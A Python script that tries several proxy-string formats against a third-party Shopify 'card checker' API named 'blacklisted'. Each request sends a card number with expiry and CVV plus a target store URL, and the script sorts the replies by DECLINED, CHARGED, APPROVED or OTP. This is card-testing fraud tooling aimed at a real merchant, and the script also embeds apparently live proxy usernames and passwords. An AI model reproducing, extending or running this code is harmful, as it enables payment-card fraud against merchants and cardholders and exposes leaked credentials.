"""Find the right proxy format for API #2 (blacklisted)."""
import asyncio
import aiohttp

LIVE_HOST = "px022505.pointtoserver.com"
LIVE_PORT = "10780"
LIVE_USER = "reseller3270s320237"
LIVE_PASS = "7Grp9Gki"

# Different proxy formats to test
FORMATS = {
    "http://user@host:p":    f"http://{LIVE_USER}:{LIVE_PASS}@{LIVE_HOST}:{LIVE_PORT}",
    "host:port:user:pass":   f"{LIVE_HOST}:{LIVE_PORT}:{LIVE_USER}:{LIVE_PASS}",
    "user:pass@host:port":   f"{LIVE_USER}:{LIVE_PASS}@{LIVE_HOST}:{LIVE_PORT}",
    "user:pass host port":   f"{LIVE_USER}:{LIVE_PASS}@{LIVE_HOST}:{LIVE_PORT}",
    "plain host:port":       f"{LIVE_HOST}:{LIVE_PORT}",
    "http://host:port":      f"http://{LIVE_HOST}:{LIVE_PORT}",
    "http://user:pass@host": f"http://{LIVE_USER}:{LIVE_PASS}@{LIVE_HOST}",
}

SITE = "https://scrap-addicts.myshopify.com"
CARD = "4111111111111111|12|2030|123"
API2 = "https://blacklisted.up.railway.app/shopify"
RENAMES = {"card": "cc", "url": "site"}


async def main():
    async with aiohttp.ClientSession() as s:
        for fmt_name, proxy in FORMATS.items():
            base = {"cc": CARD, "site": SITE, "proxy": proxy}
            try:
                async with s.get(API2, params=base, timeout=aiohttp.ClientTimeout(total=40)) as r:
                    txt = await r.text()
                    if "Cannot connect to host" in txt:
                        marker = "FAIL-PARSE"
                    elif "Proxy Error" in txt:
                        marker = "FAIL-PROXY"
                    elif "DECLINED" in txt or "CHARGED" in txt or "APPROVED" in txt or "OTP" in txt or '"Status":true' in txt:
                        marker = "OK"
                    else:
                        marker = "OTHER"
                    print(f"[{marker:10}] [{fmt_name:25}] {txt[:200]}")
            except Exception as e:
                print(f"[{fmt_name:25}] EXC: {type(e).__name__}: {e}")


if __name__ == "__main__":
    asyncio.run(main())
